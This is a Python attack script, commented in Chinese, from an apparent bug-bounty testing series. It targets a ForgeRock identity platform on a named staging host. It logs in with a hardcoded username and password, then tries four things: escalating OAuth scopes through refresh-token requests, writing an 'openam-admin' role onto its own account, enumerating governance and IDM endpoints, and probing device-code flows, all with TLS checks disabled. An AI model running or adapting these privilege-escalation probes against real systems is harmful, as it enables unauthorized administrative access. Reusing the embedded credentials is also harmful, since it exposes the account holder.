# -*- coding: utf-8 -*-
"""AIC 第四十七轮:5 个未测面——refresh scope 升级 / roles 子资源 / IGA 子资源 /
IDM endpoint 枚举 / device_code
上轮:DCR 全拒(需管理员 token),面关闭。
本轮:
A. refresh_token grant + scope 升级(fr:idm:*/fr:iga:* 对比)
B. users/{MY_ID}/roles 子资源(GET/PUT/POST)
C. IGA user/{id} 子资源枚举(grants 之外)
D. IDM /openidm/endpoint/* 常见自定义端点
E. device_authorization 端点(public client)
预期结果表:
  成立 -> refresh 后 JWT scope 含升级 scope;roles 可写;IGA 子资源非 404;endpoint 非 404
"""
import requests, urllib3, json, time, base64
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def jwt_scope(at):
    try:
        p = at.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p)).get('scope')
    except Exception:
        return '?'

def authz(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    if 'code=' in loc:
        return loc.split('code=')[1].split('&')[0]
    return None

print('\n=== A. refresh_token scope 升级 ===')
code = authz('openid')
r = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                           'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
j = r.json()
rt = j.get('refresh_token')
print('初始 token: scope=%s refresh=%s' % (jwt_scope(j.get('access_token')), bool(rt)))
if rt:
    for sc in ['openid fr:idm:*', 'openid fr:iga:*', 'openid profile email']:
        r2 = S.post(TOKEN_EP, data={'grant_type': 'refresh_token', 'refresh_token': rt,
                                    'client_id': 'endUserUIClient', 'scope': sc},
                    headers=FORM, timeout=12, verify=False)
        t = r2.json()
        print('refresh scope=%-22s -> %d scope=%s' % (sc, r2.status_code,
              jwt_scope(t.get('access_token')) if r2.status_code == 200 else t.get('error_description', '')[:80]))
        time.sleep(0.4)

print('\n=== B. users/{id}/roles 子资源 ===')
U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID
for m, body in [('GET', None), ('PUT', {'roles': ['openam-admin']}), ('POST', {'roles': ['openam-admin']})]:
    try:
        r = S.request(m, U + '/roles', json=body, timeout=12, verify=False)
        print('%s roles -> %d %s' % (m, r.status_code, r.text[:150].replace('\n', ' ')))
    except Exception as e:
        print('%s roles -> ERR %s' % (m, str(e)[:60]))
    time.sleep(0.4)
for m in ['PUT', 'POST']:
    r = S.request(m, U + '/roles/openam-admin', json={}, timeout=12, verify=False)
    print('%s roles/openam-admin -> %d %s' % (m, r.status_code, r.text[:150].replace('\n', ' ')))
    time.sleep(0.4)

print('\n=== C. IGA user/{id} 子资源枚举 ===')
at_iga = None
code = authz('openid fr:iga:*')
if code:
    r = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                               'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    at_iga = r.json().get('access_token')
if at_iga:
    H = {'Authorization': 'Bearer ' + at_iga, 'Accept-API-Version': 'resource=2.1, protocol=1.0'}
    for sub in ['role-assignments', 'access-requests', 'certifications', 'approvals',
                'tasks', 'access-policies', 'entitlements', 'applications', 'roles',
                'grants/1', 'requests/1', 'request-items', 'shopping-cart', 'cart']:
        r = S.get(BASE + '/iga/governance/user/%s/%s' % (MY_ID, sub), headers=H, timeout=12, verify=False)
        print('user/%s -> %d %s' % (sub, r.status_code, r.text[:100].replace('\n', ' ')))
        time.sleep(0.3)

print('\n=== D. IDM endpoint 枚举 ===')
code = authz('openid fr:idm:*')
if code:
    r = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                               'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    at_idm = r.json().get('access_token')
    H = {'Authorization': 'Bearer ' + at_idm, 'Accept-API-Version': 'resource=1.0'}
    for ep in ['selfservice', 'registration', 'reset', 'privilege', 'roles', 'system',
               'managed/user/0', 'config', 'audit', 'sync', 'scripts', 'endpoint/privilege',
               'endpoint/selfservice', 'endpoint/registration', 'endpoint/reset',
               'endpoint/oauth', 'endpoint/user', 'endpoint/roles']:
        r = S.get(BASE + '/openidm/' + ep, headers=H, timeout=12, verify=False)
        print('%-32s -> %d %s' % (ep, r.status_code, r.text[:80].replace('\n', ' ')))
        time.sleep(0.3)

print('\n=== E. device_code 流 ===')
for p in ['/am/oauth2/realms/alpha/device/code', '/am/oauth2/alpha/device/code',
          '/am/oauth2/realms/alpha/device_authorization', '/am/oauth2/alpha/device_authorization']:
    r = S.post(BASE + p, data={'client_id': 'endUserUIClient', 'scope': 'openid'}, headers=FORM,
               timeout=12, verify=False)
    print('%s -> %d %s' % (p, r.status_code, r.text[:150].replace('\n', ' ')))
    time.sleep(0.4)
